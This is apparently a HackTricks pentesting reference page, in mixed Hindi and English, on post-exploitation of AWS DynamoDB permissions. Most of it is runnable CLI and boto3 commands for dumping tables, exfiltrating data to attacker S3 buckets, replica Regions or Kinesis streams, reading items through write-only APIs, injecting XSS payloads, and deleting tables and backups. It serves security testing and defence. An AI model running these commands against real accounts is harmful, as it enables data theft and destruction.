# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

इन अनुमतियों वाले हमलावर को **तालिकाओं से प्राथमिक कुंजी के माध्यम से आइटम प्राप्त करने** में सक्षम होगा (आप सीधे तालिका का पूरा डेटा नहीं मांग सकते)। इसका मतलब है कि आपको प्राथमिक कुंजियाँ पता होनी चाहिए (आप यह तालिका के metadata (`describe-table`) से प्राप्त कर सकते हैं)।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** टेबल में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:GetItem`

**पिछली अनुमतियों के समान** यह अनुमति एक संभावित attacker को केवल 1 टेबल से उस एंट्री की प्राथमिक कुंजी दिए जाने पर मान पढ़ने की अनुमति देती है:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
इस अनुमति के साथ **`transact-get-items`** method का उपयोग भी इस तरह किया जा सकता है:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**संभावित प्रभाव:** तालिका में संवेदनशील जानकारी का पता लगाकर Indirect privesc

### `dynamodb:Query`

**Similar to the previous permissions** यह अनुमति देता है कि एक संभावित attacker केवल 1 table से मान पढ़ सके जब entry की primary key दी गई हो जिसे retrieve करना हो। यह [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) का उपयोग करने की अनुमति देता है, लेकिन primary key (जो मौजूद होना आवश्यक है) के साथ केवल comparison "EQ" की अनुमति है, इसलिए आप किसी request में पूरा DB प्राप्त करने के लिए comparison का उपयोग नहीं कर सकते।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** तालिका में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:Scan`

आप इस अनुमति का उपयोग करके **पूरी table को आसानीसे dump कर सकते हैं।**
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potential Impact:** टेबल में संवेदनशील जानकारी का पता लगाकर परोक्ष privesc

### `dynamodb:PartiQLSelect`

आप इस अनुमति का उपयोग करके **पूरी टेबल को आसानी से dump** कर सकते हैं।
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
यह अनुमति `batch-execute-statement` जैसी कार्रवाइयाँ करने की भी अनुमति देती है:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
लेकिन आपको प्राथमिक कुंजी के साथ एक मान निर्दिष्ट करना होगा, इसलिए यह इतना उपयोगी नहीं है।

**Potential Impact:** अप्रत्यक्ष privesc — टेबल में संवेदनशील जानकारी का पता लगाने से

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

यह अनुमति एक हमलावर को उसकी चुनी हुई S3 bucket में **पूरी तालिका को निर्यात करने** की अनुमति देगी:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
ध्यान दें कि यह काम करने के लिए तालिका में point-in-time-recovery सक्षम होना चाहिए, आप यह जांच सकते हैं कि तालिका में यह है या नहीं इसके लिए:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
यदि यह सक्षम नहीं है, तो आपको **इसे सक्षम करना होगा** और इसके लिए आपको **`dynamodb:ExportTableToPointInTime`** अनुमति चाहिए:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potential Impact:** अप्रत्यक्ष privesc द्वारा टेबल में संवेदनशील जानकारी का पता लगाकर

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

इन अनुमतियों के साथ, एक हमलावर **create a new table from a backup** कर सकेगा (या यहाँ तक कि एक बैकअप बना कर उसे किसी अलग टेबल में restore कर सकता है)। फिर, आवश्यक अनुमतियों के साथ, वह बैकअप से **information** जांच सकेगा जो c**ould not be any more in the production** table.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** टेबल बैकअप में संवेदनशील जानकारी ढूँढकर अप्रत्यक्ष privesc

### `dynamodb:PutItem`

यह अनुमति उपयोगकर्ताओं को तालिका में **नया आइटम जोड़ने या किसी मौजूदा आइटम को नए आइटम से प्रतिस्थापित करने** की अनुमति देती है। यदि समान प्राथमिक कुंजी वाला आइटम पहले से मौजूद है, तो **संपूर्ण आइटम नए आइटम से प्रतिस्थापित कर दिया जाएगा**। यदि प्राथमिक कुंजी मौजूद नहीं है, तो निर्दिष्ट प्राथमिक कुंजी के साथ एक नया आइटम **बनाया जाएगा**।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने से vulnerabilities/bypasses का और अधिक शोषण हो सकता है

### `dynamodb:UpdateItem`

यह permission उपयोगकर्ताओं को **किसी आइटम के मौजूदा गुणों को संशोधित करने या किसी आइटम में नए गुण जोड़ने** की अनुमति देता है। यह पूरे आइटम को **बदलता नहीं है**; यह केवल निर्दिष्ट विशेषताओं को ही अपडेट करता है। यदि तालिका में प्राथमिक कुंजी मौजूद नहीं है, तो यह ऑपरेशन निर्दिष्ट प्राथमिक कुंजी के साथ **एक नया आइटम बनाएगा** और update expression में निर्दिष्ट विशेषताओं को सेट करेगा।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने पर और भी vulnerabilities/bypasses का शोषण संभव है।

### `dynamodb:DeleteTable`

इस अनुमति वाले हमलावर **DynamoDB table को delete कर सकते हैं, जिससे डेटा हानि हो सकती है**।
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potential impact**: डेटा हानि और हटाई गई तालिका पर निर्भर सेवाओं में व्यवधान।

### `dynamodb:DeleteBackup`

इस अनुमति वाले attacker **DynamoDB का बैकअप हटा सकता है, जो आपदा पुनर्प्राप्ति की स्थिति में संभावित रूप से डेटा हानि का कारण बन सकता है**।
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potential impact**: डेटा हानि और आपदा पुनर्प्राप्ति परिदृश्य के दौरान बैकअप से पुनर्प्राप्त करने में असमर्थता।

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: जाँचें कि यह वास्तव में काम करता है

इन अनुमतियों वाले एक हमलावर को **DynamoDB table पर एक stream सक्षम करने, table को अपडेट करके changes को stream करना शुरू करने, और फिर stream तक पहुँचकर table में होने वाले changes को real-time में मॉनिटर करने** की क्षमता मिलती है। यह हमलावर को data changes को मॉनिटर और exfiltrate करने की अनुमति देता है, जो संभावित रूप से data leakage का कारण बन सकता है।

1. DynamoDB table पर एक stream सक्षम करें:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN और अन्य विवरण प्राप्त करने के लिए stream का वर्णन करें:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. stream ARN का उपयोग करके shard iterator प्राप्त करें:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator का उपयोग stream से डेटा तक पहुँचने और exfiltrate करने के लिए करें:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**संभावित प्रभाव**: DynamoDB table के परिवर्तनों का real-time monitoring और data leakage.

### `dynamodb:UpdateItem` और `ReturnValues=ALL_OLD` के माध्यम से आइटम पढ़ें

यदि किसी table पर केवल `dynamodb:UpdateItem` की अनुमति वाला एक हमलावर हो, तो वह एक benign update करके और `--return-values ALL_OLD` का अनुरोध करके सामान्य read permissions (`GetItem`/`Query`/`Scan`) के बिना आइटम पढ़ सकता है। DynamoDB response के `Attributes` फील्ड में आइटम की पूर्ण pre-update image लौटाएगा (यह RCUs को consume नहीं करता)।

- न्यूनतम अनुमतियाँ: लक्ष्य table/key पर `dynamodb:UpdateItem`।
- पूर्वापेक्षाएँ: आपको आइटम की प्राथमिक कुंजी पता होनी चाहिए।

उदाहरण (एक निरापद attribute जोड़ता है और प्रतिक्रिया में पिछले आइटम को exfiltrates करता है):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI response में एक `Attributes` ब्लॉक होगा जो complete previous item (all attributes) को शामिल करेगा, जो write-only access से effectively एक read primitive प्रदान करता है।

**Potential Impact:** केवल write permissions के साथ एक table से arbitrary items पढ़े जा सकते हैं, और जब primary keys ज्ञात हों तो sensitive data exfiltration संभव हो जाती है।


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

DynamoDB Global Table (version 2019.11.21) में एक नया replica Region जोड़कर Stealth exfiltration। यदि किसी principal को regional replica जोड़ने की अनुमति है, तो पूरा table attacker-chosen Region में replicate हो जाएगा, जहाँ से attacker सभी items पढ़ सकता है।

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

Permissions: `dynamodb:UpdateTable` (with `replica-updates`) or `dynamodb:CreateTableReplica` on the target table. If CMK is used in the replica, KMS permissions for that key may be required.

Potential Impact: Full-table replication to an attacker-controlled Region leading to stealthy data exfiltration.

### `dynamodb:TransactWriteItems` (failed condition के जरिए पढ़ना + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

एक attacker जिसके पास transactional write privileges हैं, वह किसी मौजूदा item के पूर्ण attributes को exfiltrate कर सकता है — `TransactWriteItems` के अंदर `Update` करके जो जानबूझकर `ConditionExpression` को fail कर देता है, और साथ में `ReturnValuesOnConditionCheckFailure=ALL_OLD` सेट करता है। विफलता होने पर, DynamoDB transaction cancellation reasons में पहले के attributes शामिल करता है, जिससे write-only access प्रभावी रूप से लक्षित keys का read access बन जाता है।

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:TransactWriteItems` लक्ष्य टेबल पर (और संबंधित आइटम पर)। किसी भी पढ़ने की अनुमति (read permissions) आवश्यक नहीं हैं।

संभावित प्रभाव: केवल transactional write privileges का उपयोग करके (वापसी किए गए cancellation reasons के माध्यम से) किसी टेबल से primary key के आधार पर arbitrary items पढ़े जा सकते हैं।


### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` GSI पर

किसी low-entropy attribute पर `ProjectionType=ALL` के साथ Global Secondary Index (GSI) बनाकर read प्रतिबंधों को बायपास करें, उस attribute को सभी items में एक constant मान पर सेट करें, और फिर पूर्ण items प्राप्त करने के लिए index को `Query` करें। यह तब भी काम करता है जब base table पर `Query`/`Scan` अस्वीकृत हों, बशर्ते आप index ARN को query कर सकें।

- न्यूनतम अनुमतियाँ:
- `dynamodb:UpdateTable` लक्ष्य टेबल पर (GSI को `ProjectionType=ALL` के साथ बनाने के लिए)।
- `dynamodb:UpdateItem` लक्ष्य टेबल की keys पर (प्रत्येक item पर indexed attribute सेट करने के लिए)।
- `dynamodb:Query` index resource ARN पर (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

कदम (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**संभावित प्रभाव:** एक नए बनाए गए GSI को क्वेरी करके तालिका की पूरी जानकारी निकाल ली जा सकती है जो सभी attributes प्रोजेक्ट करता है, भले ही बेस टेबल के read APIs को deny किया गया हो।


### `dynamodb:EnableKinesisStreamingDestination` (Kinesis Data Streams के माध्यम से निरंतर एक्सफ़िल्ट्रेशन)

DynamoDB Kinesis streaming destinations का दुरुपयोग करके तालिका में हुए परिवर्तनों को हमलावर-नियंत्रित Kinesis Data Stream में लगातार एक्सफ़िल्ट्रेट किया जा सकता है। एक बार enabled होने पर, हर INSERT/MODIFY/REMOVE इवेंट लगभग real-time में stream को अग्रेषित कर दिया जाता है और इसके लिए तालिका पर read permissions की आवश्यकता नहीं होती।

Minimum permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` on the target table
- Optionally `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` to monitor status
- Read permissions on the attacker-owned Kinesis stream to consume records: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
</details>

**संभावित प्रभाव:** तालिका परिवर्तनों का निरंतर, लगभग वास्तविक-समय में attacker-controlled Kinesis stream पर exfiltration, तालिका पर सीधे read operations किए बिना।

{{#include ../../../../banners/hacktricks-training.md}}
